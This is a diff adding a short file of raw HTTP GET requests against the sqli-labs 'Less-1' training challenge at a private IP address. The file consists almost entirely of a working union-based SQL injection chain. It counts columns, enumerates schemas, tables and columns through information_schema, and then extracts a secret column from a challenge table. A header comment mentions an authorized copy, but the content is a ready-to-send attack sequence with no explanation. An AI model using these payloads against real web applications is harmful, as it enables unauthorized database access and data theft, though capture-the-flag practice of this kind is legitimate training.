@@ -1,0 +1,22 @@
+# Historical target: http://192.168.156.23/
+# Challenge: sqli-labs Less-1
+# These are equivalent payload structures. Confirm the historical app path in
+# an authorized copy before sending requests.
+
+GET /Less-1/?id=1%27%20ORDER%20BY%203%20--+ HTTP/1.1
+Host: 192.168.156.23
+
+GET /Less-1/?id=-1%27%20UNION%20SELECT%201%2C2%2C3%20--+ HTTP/1.1
+Host: 192.168.156.23
+
+GET /Less-1/?id=-1%27%20UNION%20SELECT%201%2CGROUP_CONCAT(schema_name)%2C3%20FROM%20information_schema.schemata%20--+ HTTP/1.1
+Host: 192.168.156.23
+
+GET /Less-1/?id=-1%27%20UNION%20SELECT%201%2CGROUP_CONCAT(table_name)%2C3%20FROM%20information_schema.tables%20WHERE%20table_schema%3D%27challenges%27%20--+ HTTP/1.1
+Host: 192.168.156.23
+
+GET /Less-1/?id=-1%27%20UNION%20SELECT%201%2CGROUP_CONCAT(column_name)%2C3%20FROM%20information_schema.columns%20WHERE%20table_schema%3D%27challenges%27%20AND%20table_name%3D%27c7zric1el1%27%20--+ HTTP/1.1
+Host: 192.168.156.23
+
+GET /Less-1/?id=-1%27%20UNION%20SELECT%201%2Csecret_0PKW%2C3%20FROM%20challenges.c7zric1el1%20--+ HTTP/1.1
+Host: 192.168.156.23
